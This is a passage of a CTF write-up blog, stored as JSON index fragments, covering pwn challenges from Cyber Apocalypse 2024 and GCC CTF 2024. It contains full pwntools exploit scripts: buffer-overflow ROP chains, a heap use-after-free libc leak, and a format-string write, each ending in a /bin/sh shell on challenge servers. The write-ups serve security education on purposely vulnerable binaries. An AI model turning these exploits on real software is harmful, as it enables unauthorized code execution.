0xfa1e0ff3000000c3 \u003c- retaddr[0] 0x7fffffffd708|+0x0010|+002: 0x0000000000401169 \u003cmain+0x13\u003e -\u003e 0xfffffedfe8c78948 0x7fffffffd710|+0x0018|+003: 0x00000001ffffd700 0x7fffffffd718|+0x0020|+004: 0x00007fffffffd808 -\u003e 0x00007fffffffdc44 -\u003e './sound_of_silence' 0x7fffffffd720|+0x0028|+005: 0x0000000000000000 0x7fffffffd728|+0x0030|+006: 0x26d6647c66e4aac2 0x7fffffffd730|+0x0038|+007: 0x00007fffffffd808 -\u003e 0x00007fffffffdc44 -\u003e './sound_of_silence' ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- code:x86:64 ---- 0x40117d e8defeffff \u003cmain+0x27\u003e call 0x401060 \u003cgets@plt\u003e 0x401182 90 \u003cmain+0x2c\u003e nop 0x401183 c9 \u003cmain+0x2d\u003e leave -\u003e 0x401184 c3 \u003cmain+0x2e\u003e ret It appears that rax is pointing to the address of our input. This means that if we start our payload with /bin/sh\\x00, and use the buffer overflow vulnerability to overwrite the return address with the address of the instruction mov rdi, rax; call _system, then rdi will point to the string /bin/sh\\x00, allowing us to easily get a shell without needing any libc leak. Below is the full script I used to solve this challenge: from pwn import * context.terminal = ['wezterm.exe', 'cli', 'split-pane', '--right', '--percent', '65'] remote_url = '94.237.54.161' remote_port = 32566 gdbscript = ''' b *main+46 ''' def conn(): if args.LOCAL: r = process(['./sound_of_silence']) if args.PLT_DEBUG: gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r exe = ELF('./sound_of_silence') r = conn() menu_delim = b'\u003e ' def logleak(name, val): info(name+' = %#x' % val) def sa(delim,data): return r.sendafter(delim,data) def sla(d","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:4:2","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Deathnote [medium] Description You stumble upon a mysterious and ancient tome, said to hold the secret to vanquishing your enemies. Legends speak of its magic powers, but cautionary tales warn of the dangers of misuse. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:5:0","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a binary named deathnote. Let’s try to disassemble the binary. main int __cdecl main(int argc, const char **argv, const char **envp) { unsigned __int64 v3; // rax __int64 v5[12]; // [rsp+10h] [rbp-60h] BYREF v5[11] = __readfsqword(0x28u); memset(v5, 0, 80); while ( 1 ) { while ( 1 ) { v3 = menu(); if ( v3 != 42 ) break; _(v5); } if ( v3 \u003e 0x2A ) { LABEL_13: error(\"Invalid choice!\\n\"); } else if ( v3 == 3 ) { show(v5); } else { if ( v3 \u003e 3 ) goto LABEL_13; if ( v3 == 1 ) { add(v5); } else { if ( v3 != 2 ) goto LABEL_13; delete(v5); } } } } In this challenge, we have access to three menus. Let’s examine each menu option one by one. add unsigned __int64 __fastcall add(__int64 a1) { unsigned __int8 v2; // [rsp+15h] [rbp-1Bh] unsigned __int16 num; // [rsp+16h] [rbp-1Ah] unsigned __int64 v4; // [rsp+18h] [rbp-18h] v4 = __readfsqword(0x28u); get_empty_note(a1); printf(aHowBigIsYourRe); num = read_num(); if ( num \u003e 1u \u0026\u0026 num \u003c= 0x80u ) { printf(aPage); v2 = read_num(); if ( (unsigned __int8)check_idx(v2) == 1 ) { *(_QWORD *)(8LL * v2 + a1) = malloc(num); printf(aNameOfVictim); read(0, *(void **)(8LL * v2 + a1), num - 1); printf(\"%s\\n[!] The fate of the victim has been sealed!%s\\n\\n\", \"\\x1B[1;33m\", \"\\x1B[1;36m\"); } } else { error(\"Don't play with me!\\n\"); } return v4 - __readfsqword(0x28u); } The first is a typical add function. We can allocate a chunk of up to 0x80 in size and populate it. This chunk is then stored in an array located in the main function’s stack. We’ll refer to this array as pages. show unsigned __int64 __fastcall show(__int64 a1) { unsigned __int8 num; // [rsp+17h] [rbp-9h] unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(aPage); num = read_num(); if ( (unsigned __int8)check_idx(num) == 1 ) { if ( *(_QWORD *)(8LL * num + a1) ) printf(\"\\nPage content: %s\\n\", *(const char **)(8LL * num + a1)); else error(\"Page is empty!\\n\"); } return v3 - __readfsqword(0x28u); } The second function allows us to view the content of a selected chunk. delete unsigned __int64 __fastcall delete(__int64 a1) { unsigned __int8 num; // [rsp+17h] [rbp-9h] unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(aPage); num = read_num(); if ( (unsigned __int8)check_idx(num) == 1 ) { if ( *(_QWORD *)(8LL * num + a1) ) printf(\"%s\\nRemoving page [%d]\\n\\n%s\", \"\\x1B[1;32m\", num, \"\\x1B[1;36m\"); else error(\"Page is already empty!\\n\"); free(*(void **)(8LL * num + a1)); } return v3 - __readfsqword(0x28u); } The third function enables us to delete a chosen chunk by freeing it. However, there’s a bug here: after freeing the chunk, it’s not removed from the array, leading to a Use-After-Free (UAF) vulnerability. Additionally, a hidden function is discovered, named _. _ unsigned __int64 __fastcall _(__int64 a1) { void (__fastcall *v2)(_QWORD); // [rsp+18h] [rbp-18h] unsigned __int64 v3; // [rsp+28h] [rbp-8h] v3 = __readfsqword(0x28u); puts(\"\\x1B[1;33m\"); cls(); printf(asc_2750, \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;36m\"); v2 = (void (__fastcall *)(_QWORD))strtoull(*(const char **)a1, 0LL, 16); if ( v2 || **(_BYTE **)a1 == '0' || *(_BYTE *)(*(_QWORD *)a1 + 1LL) == 'x' ) { if ( !*(_QWORD *)a1 || !*(_QWORD *)(a1 + 8) ) { error(\"What you are trying to do is unacceptable!\\n\"); exit(1312); } puts(aExecuting); v2(*(_QWORD *)(a1 + 8)); } else { puts(\"Error: Invalid hexadecimal string\"); } return v3 - __readfsqword(0x28u); } This function reads the content of the first entry in the array that stores the page added via the add() function. It will: Interpret the string stored in pages[0] as hexadecimal, then convert it into a hexadecimal number. Execute it by passing the value stored in pages[1] as the argument. This functionality essentially allows us to execute pages[0](pages[1]), meaning if we can place a valid function address in pages[0], we can achieve code execution. Now that we know the bug, let’s move to the exploitation part. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:5:1","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Solution The strategy involves exploiting the Use-After-Free vulnerability to leak libc addresses. We’ll fill the tcachebins[0x90] with up to 7 entries, so the eighth free operation moves the chunk to the unsortedbin, causing the freed chunk to contain a pointer to a libc address. By using the show function, due to the UAF, we can view the content of this eighth freed chunk, enabling us to leak a libc address. Next, with the add functionality, we set pages[0] to the hexadecimal string representation of system, set pages[1] to the string /bin/sh, and invoke the _ function to trigger code execution. Below is the full script used for exploitation: from pwn import * exe = ELF(\"deathnote_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-linux-x86-64.so.2\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' context.terminal = ['wezterm.exe', 'cli', 'split-pane', '--right', '--percent', '65'] warnings.simplefilter(\"ignore\") remote_url = \"83.136.249.57\" remote_port = 30276 gdbscript = ''' b *_+296 ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r r = conn() menu_delim = b'\\xf0\\x9f\\x92\\x80 ' def logbase(): info('libc.address = %#x' % libc.address) def logleak(name, val): info(name+' = %#x' % val) def sa(delim,data): return r.sendafter(delim,data) def sla(delim,line): return r.sendlineafter(delim,line) def sl(line): return r.sendline(line) def so(data): return r.send(data) def sn(num): return str(num).encode() def menu(num): return sla(menu_delim, sn(num)) def add(sz, idx, val): menu(1) sla(menu_delim, sn(sz)) sla(menu_delim, sn(idx)) sla(menu_delim, val) def delete(idx): menu(2) sla(menu_delim, sn(idx)) def show(idx): menu(3) sla(menu_delim, sn(idx)) r.recvuntil(b'content: ') return r.recvline().strip() # Allocate 9 chunks for i in range(9): info(f'add-{i}') add(0x80, i, b'/bin/sh\\x00') # Fulfill tcache for i in range(7): info(f'del-{i}') delete(i) # This free will put the freed chunk to unsorted bin info(f'del-{7}') delete(7) # With the UAF bug, use `show()` to get a libc leak info(f'leak...') libc.address = u64(show(7)[:6].ljust(8, b'\\x00')) - (libc.symbols['main_arena']+96) logleak('libc.address', libc.address) logleak('system', libc.sym.system) # Setup pages[0] and pages[1], then trigger the `_` func add(0x50, 0, hex(libc.sym.system)[2:].encode()) add(0x50, 1, b'/bin/sh\\x00') # Execute pages[0](pages[1]) menu(42) r.interactive() Flag: HTB{0m43_w4_m0u_5h1nd31ru~uWu} ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:5:2","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Rocket Blaster XXX [easy] Description Prepare for the ultimate showdown! Load your weapons, gear up for battle, and dive into the epic fray—let the fight commence! ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:6:0","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a binary named rocket_blaster_xxx. Let’s try to disassemble the binary. int __cdecl main(int argc, const char **argv, const char **envp) { __int64 buf[4]; // [rsp+0h] [rbp-20h] BYREF banner(argc, argv, envp); memset(buf, 0, sizeof(buf)); fflush(_bss_start); printf( \"\\n\" \"Prepare for trouble and make it double, or triple..\\n\" \"\\n\" \"You need to place the ammo in the right place to load the Rocket Blaster XXX!\\n\" \"\\n\" \"\u003e\u003e \"); fflush(_bss_start); read(0, buf, 0x66uLL); puts(\"\\nPreparing beta testing..\"); return 0; } As you can see, there is an obvious buffer overflow bug again. Let’s check the binary mitigation. ╰─❯ checksec rocket_blaster_xxx Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) We can see that the binary is No PIE, meaning that we can extract some gadgets from the binary and use it without any leak. Based on these two information, we can start crafting our exploit. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:6:1","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Solution Upon checking through the gadgets with ropr, we can see two interesting gadgets: 0x0040159d: pop rsi; ret; 0x0040159f: pop rdi; ret; Using these two gadgets, we can do ROP chain leveraging the buffer overflow bug. The first ROP chain is we will control the program execution flow so that it will: Call puts(puts_got) to get a libc leak. Return back to main, so that we can trigger once again the buffer overflow Prepare a ROP chain to call system(\"/bin/sh\"). Below is the full script with detailed comment: from pwn import * exe = ELF(\"rocket_blaster_xxx_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-linux-x86-64.so.2\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") remote_url = \"94.237.54.183\" remote_port = 41539 gdbscript = ''' ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r r = conn() menu_delim = b'\u003e ' def logbase(): info('libc.address = %#x' % libc.address) def logleak(name, val): info(name+' = %#x' % val) def sa(delim,data): return r.sendafter(delim,data) def sla(delim,line): return r.sendlineafter(delim,line) def sl(line): return r.sendline(line) def so(data): return r.send(data) def sn(num): return str(num).encode() def menu(num): return sla(menu_delim, sn(num)) pop_rdi = 0x000000000040159f pop_rsi = 0x000000000040159d # 1st ROP: Leak libc via puts, then return back to main payload = b'a'*0x20 payload += p64(exe.bss()+0x100) payload += p64(pop_rdi) payload += p64(exe.got.puts) payload += p64(exe.plt.puts) payload += p64(exe.sym.main) sla(b'\u003e\u003e ', payload) r.recvuntil(b'\\nPreparing beta testing..\\n') libc.address = u64(r.recv(6).ljust(8, b'\\x00')) - libc.sym.puts logleak('libc.address', libc.address) # 2nd ROP: Call system(\"/bin/sh\") payload = b'a'*0x20 payload += p64(exe.bss()+0x100) payload += p64(pop_rdi+1) payload += p64(pop_rdi) payload += p64(next(libc.search(b'/bin/sh\\x00'))) payload += p64(libc.sym.system) sla(b'\u003e\u003e ', payload) r.interactive() Flag: HTB{b00m_b00m_r0ck3t_2_th3_m00n} ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:6:2","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Pet Companion [easy] Description Embark on a journey through this expansive reality, where survival hinges on battling foes. In your quest, a loyal companion is essential. Dogs, mutated and implanted with chips, become your customizable allies. Tailor your pet’s demeanor—whether happy, angry, sad, or funny—to enhance your bond on this perilous adventure. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:7:0","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a binary named pet_companion. Let’s try to disassemble the binary. int __cdecl main(int argc, const char **argv, const char **envp) { __int64 buf[8]; // [rsp+0h] [rbp-40h] BYREF setup(argc, argv, envp); memset(buf, 0, sizeof(buf)); write(1, \"\\n[!] Set your pet companion's current status: \", 0x2EuLL); read(0, buf, 0x100uLL); write(1, \"\\n[*] Configuring...\\n\\n\", 0x15uLL); return 0; } There is an obvious buffer overflow in here. Another thing to check is the binary mitigation. ╰─❯ checksec pet_companion Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) We can see that the binary is No PIE, meaning that we can extract some gadgets from the binary and use it without any leak. Based on these two information, we can start crafting our exploit. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:7:1","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Solution Upon checking through the gadgets with ropr, we can see two interesting gadgets: 0x00400741: pop rsi; pop r15; ret; 0x00400743: pop rdi; ret; Using these two gadgets, we can do ROP chain leveraging the buffer overflow bug. The first ROP chain is we will control the program execution flow so that it will: Call write to leak the read got address. Return back to main, so that we can trigger once again the buffer overflow Prepare a ROP chain to call system(\"/bin/sh\"). Below is the full script with detailed comment: from pwn import * exe = ELF(\"pet_companion_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-linux-x86-64.so.2\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") remote_url = \"94.237.56.248\" remote_port = 44146 gdbscript = ''' ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r r = conn() menu_delim = b'\u003e ' def logbase(): info('libc.address = %#x' % libc.address) def logleak(name, val): info(name+' = %#x' % val) def sa(delim,data): return r.sendafter(delim,data) def sla(delim,line): return r.sendlineafter(delim,line) def sl(line): return r.sendline(line) def so(data): return r.send(data) def sn(num): return str(num).encode() def menu(num): return sla(menu_delim, sn(num)) pop_rdi = 0x0000000000400743 pop_rsi_r15 = 0x0000000000400741 # 1st ROP: Leak read via write, then back to main payload = b'a'*0x40 payload += p64(exe.bss()+0x100) payload += p64(pop_rsi_r15) payload += p64(exe.got.read) payload += p64(0) payload += p64(exe.plt.write) payload += p64(exe.sym.main) sla(b': ', payload) r.recvuntil(b'Configuring...\\n\\n') libc.address = u64(r.recv(6).ljust(8, b'\\x00')) - libc.sym.read logleak('libc.address', libc.address) # 2nd ROP: Execute system(\"/bin/sh\") payload = b'a'*0x40 payload += p64(exe.bss()+0x100) payload += p64(pop_rdi) payload += p64(next(libc.search(b'/bin/sh\\x00'))) payload += p64(libc.sym.system) sla(b': ', payload) r.interactive() Flag: HTB{c0nf1gur3_w3r_d0g} ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:7:2","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Writing on the Wall [very easy] Description As you approach a password-protected door, a sense of uncertainty envelops you—no clues, no hints. Yet, just as confusion takes hold, your gaze locks onto cryptic markings adorning the nearby wall. Could this be the elusive password, waiting to unveil the door’s secrets? ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:8:0","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a binary named writing_on_the_wall. Let’s try to disassemble the binary. int __cdecl main(int argc, const char **argv, const char **envp) { char buf[6]; // [rsp+Ah] [rbp-16h] BYREF char s2[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); *(_QWORD *)s2 = ' ssapt3w'; read(0, buf, 7uLL); if ( !strcmp(buf, s2) ) open_door(); else error(\"You activated the alarm! Troops are coming your way, RUN!\\n\"); return 0; } unsigned __int64 open_door() { char buf; // [rsp+3h] [rbp-Dh] BYREF int fd; // [rsp+4h] [rbp-Ch] unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); fd = open(\"./flag.txt\", 0); if ( fd \u003c 0 ) { perror(\"\\nError opening flag.txt, please contact an Administrator.\\n\"); exit(1); } printf(\"You managed to open the door! Here is the password for the next one: \"); while ( read(fd, \u0026buf, 1uLL) \u003e 0 ) fputc(buf, _bss_start); close(fd); return v3 - __readfsqword(0x28u); } The objective here is to circumvent the strcmp(buf, s2) check, thereby activating the open_door() function, which consequently reveals the flag. The underlying issue lies in the fact that the buf size is actually 0x6, presenting an opportunity for a one-byte overflow, which can be leveraged to modify the first character of s2. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:8:1","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Solution To tackle this challenge, sending b'\\x00'*7 as the input effectively sets the first character of s2 to a NULL-terminator. As a result, the strcmp(buf, s2) operation compares two NULL strings, successfully bypassing the condition. Below is the complete script I used: from pwn import * exe = ELF(\"writing_on_the_wall_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-linux-x86-64.so.2\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") remote_url = \"83.136.254.142\" remote_port = 36857 gdbscript = ''' ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r r = conn() menu_delim = b'\u003e ' def logbase(): info('libc.address = %#x' % libc.address) def logleak(name, val): info(name+' = %#x' % val) def sa(delim,data): return r.sendafter(delim,data) def sla(delim,line): return r.sendlineafter(delim,line) def sl(line): return r.sendline(line) def so(data): return r.send(data) def sn(num): return str(num).encode() def menu(num): return sla(menu_delim, sn(num)) sla(b'\u003e\u003e ', b'\\x00'*7) r.interactive() Flag: HTB{3v3ryth1ng_15_r34d4bl3} ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:8:2","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Delulu [very easy] Description HALT! Recognition protocol initiated. Please present your face for scanning. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:9:0","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a binary named delulu. Our first step is to disassemble the binary to understand its workings. int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v4[2]; // [rsp+0h] [rbp-40h] BYREF __int64 buf[6]; // [rsp+10h] [rbp-30h] BYREF buf[5] = __readfsqword(0x28u); v4[0] = 0x1337BABELL; v4[1] = (__int64)v4; memset(buf, 0, 32); read(0, buf, 0x1FuLL); printf(\"\\n[!] Checking.. \"); printf((const char *)buf); if ( v4[0] == 0x1337BEEF ) delulu(); else error(\"ALERT ALERT ALERT ALERT\\n\"); return 0; } unsigned __int64 delulu() { char buf; // [rsp+3h] [rbp-Dh] BYREF int fd; // [rsp+4h] [rbp-Ch] unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); fd = open(\"./flag.txt\", 0); if ( fd \u003c 0 ) { perror(\"\\nError opening flag.txt, please contact an Administrator.\\n\"); exit(1); } printf(\"You managed to deceive the robot, here's your new identity: \"); while ( read(fd, \u0026buf, 1uLL) \u003e 0 ) fputc(buf, _bss_start); close(fd); return v3 - __readfsqword(0x28u); } Based on reading the above code, we can see that the objective is to modify the value of v4[0] from 0x1337BABE to 0x1337BEEF. This change triggers the delulu() function, which in turn, prints the flag. Notably, the binary contains a format string vulnerability. Additionally, it’s observed that v4[1] holds the address of v4[0], the exact location we aim to manipulate. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:9:1","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Solution To exploit this challenge, leveraging the format string vulnerability is key. Through manual inspection, %7$p reveals the value of v4[1], which is effectively v4[0]. To precisely overwrite the last two bytes of v4[0], sending the input %48879c%7$hn to the challenge suffices. The directive %48879c generates 0xBEEF worth of space characters, followed by %7$hn which alters the referenced address value (in this instance, v4[0]) to match the count of characters printed so far (which amounts to 0xBEEF characters). Successfully executing this sequence overwrites v4[0], enabling us to retrieve the flag. Flag: HTB{m45t3r_0f_d3c3pt10n} Social Media Follow me on twitter ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:9:2","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":" GCC CTF 2024 I spent some of my free time to do the GCC CTF 2024. Below is my write-up for the last pwn challenge called Flag Roulette. Pwn ","date":"Mar 04, 2024","objectID":"/posts/gcc-ctf-2024/:0:0","tags":["Writeup","GCC CTF","heap","mmap","tls dtor","2024"],"title":"GCC CTF 2024","uri":"/posts/gcc-ctf-2024/"},{"categories":null,"content":"Flag Roulette Description Are you tired of solving challs? Here, have a little break. If we win my game, I will give you a flag. I promise you I will not cheat :) The flag is in the /flag file. Author: 0xdeadbeef ","date":"Mar 04, 2024","objectID":"/posts/gcc-ctf-2024/:1:0","tags":["Writeup","GCC CTF","heap","mmap","tls dtor","2024"],"title":"GCC CTF 2024","uri":"/posts/gcc-ctf-2024/"},{"categories":null,"content":"Initial Analysis In this challenge, we were provided a binary file named flag_roulette along with the supporting libraries libc, ld, and libseccomp. These libraries are essential for the binary’s execution. Let’s begin by examining the security mitigations implemented within the binary itself. Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled All security mitigations appear to be active, including the provision of the libseccomp file, indicating the application of a seccomp filter in the binary. Our next step involves attempting to dump this filter. seccomp-tools dump ./flag_roulette_patched line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x0b 0xc000003e if (A != ARCH_X86_64) goto 0013 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u003c 0x40000000) goto 0005 0004: 0x15 0x00 0x08 0xffffffff if (A != 0xffffffff) goto 0013 0005: 0x15 0x06 0x00 0x00000000 if (A == read) goto 0012 0006: 0x15 0x05 0x00 0x00000001 if (A == write) goto 0012 0007: 0x15 0x04 0x00 0x00000002 if (A == open) goto 0012 0008: 0x15 0x03 0x00 0x00000003 if (A == close) goto 0012 0009: 0x15 0x02 0x00 0x00000009 if (A == mmap) goto 0012 0010: 0x15 0x01 0x00 0x0000000b if (A == munmap) goto 0012 0011: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0013 0012: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0013: 0x06 0x00 0x00 0x00000000 return KILL Our options for code execution are limited to the traditional open-read-write strategy. We proceed by disassembling the binary to examine its key functions. main int __fastcall __noreturn main(int argc, const char **argv, const char **envp) { char v3; // [rsp+Ch] [rbp-24h] BYREF char has_a_bet; // [rsp+Dh] [rbp-23h] char i; // [rsp+Eh] [rbp-22h] char v6; // [rsp+Fh] [rbp-21h] unsigned int v7; // [rsp+10h] [rbp-20h] BYREF unsigned int v8; // [rsp+14h] [rbp-1Ch] BYREF unsigned int j; // [rsp+18h] [rbp-18h] unsigned int k; // [rsp+1Ch] [rbp-14h] void *bet; // [rsp+20h] [rbp-10h] unsigned __int64 v12; // [rsp+28h] [rbp-8h] v12 = __readfsqword(0x28u); banner(argc, argv, envp); has_a_bet = 0; while ( 1 ) { while ( 1 ) { menu(); i = 0; v6 = 0; for ( i = getchar(); i == 10; i = getchar() ) ; while ( v6 != 10 ) v6 = getchar(); if ( i == '3' ) break; if ( i \u003c= '3' ) { if ( i == '1' ) { if ( has_a_bet == 1 ) { puts(\"You already have a bet placed\"); } else { puts(\"How many bytes would you like to bet on ?\"); printf(\"\u003e \"); __isoc99_scanf(\"%ud\", \u0026v8); if ( (int)v8 \u003e 127 ) { if ( (int)v8 \u003c= 135168 ) { bet = malloc((int)v8); for ( j = 0; j \u003c v8; ++j ) { do { do *((_BYTE *)bet + j) = rand(); while ( *((char *)bet + j) \u003c= 31 ); } while ( *((_BYTE *)bet + j) == 127 ); } puts(\"Random pattern generated successfully\"); puts(\"\\nAs a sign of good will, we will let you modify set exactly one byte in this sea of randomness\"); puts(\"Please choose the index of the byte to modify\"); printf(\"\u003e \"); __isoc99_scanf(\"%ud\", \u0026v7); puts(\"Please set the new value of this byte\"); printf(\"\u003e \"); __isoc99_scanf(\"%ud\", \u0026v3); *((_BYTE *)bet + v7) = v3; puts(\"Modification successful\"); has_a_bet = 1; } else { puts(\"Come on, you cannot be THAT lucky ;)\"); } } else { puts(\"Not enough bytes\"); puts(\"The bet is not risky enough\"); } } } else if ( i == '2' ) { if ( has_a_bet ) { free(bet); bet = 0LL; puts(\"Bet successfully deleted\"); has_a_bet = 0; } else { puts(\"You have no bet placed\"); } } } } if ( has_a_bet ) break; puts(\"You have not placed a bet !\"); } printf(\"Your bet : %s\\n\", (const char *)bet); for ( k = 0; k \u003c v8; k += 3 ) { if ( *((_BYTE *)bet + k) != 71 ) lose(); if ( *((_BYTE *)bet + k + 1) != 67 ) lose(); if ( *((_BYTE *)bet + k + 2) != 67 ) lose(); } win(); } Within this function, we find three interactive menus: Place a bet Delete a bet Spin the roulette Focusing on each menu, we start with the first. This menu checks if a bet has been placed using the has_a_bet variable. If no bet is detected, it prompts for the size of the b","date":"Mar 04, 2024","objectID":"/posts/gcc-ctf-2024/:1:1","tags":["Writeup","GCC CTF","heap","mmap","tls dtor","2024"],"title":"GCC CTF 2024","uri":"/posts/gcc-ctf-2024/"},{"categories":null,"content":"Solution Summarizing our progress: Allocation of a chunk is possible within the size range from 0x80 to 0x21000. Only a single chunk can be active at any given time. The ability to free the currently active chunk is available. Execution of an exit command is permitted. Typically, in exploiting such scenarios, the initial step involves obtaining a memory leak. Following this, we strategize on utilizing the leak to facilitate code execution. Getting libc leak In order to achieve code execution, the first step is figuring out how to get a leak. It’s noteworthy that the largest chunk size we can allocate is significantly large, more than 0x20000. Looking into how malloc works, there’s a detail where, if the requested size is large (exceeding the mp_.mmap_threshold, which defaults to 128*1024 = 0x20000), it uses mmap instead of placing the chunk in the heap. ... DEFAULT_MMAP_THRESHOLD 128 * 1024 ... static struct malloc_par mp_ = { ... .mmap_threshold = DEFAULT_MMAP_THRESHOLD, ... }; ... static void * sysmalloc 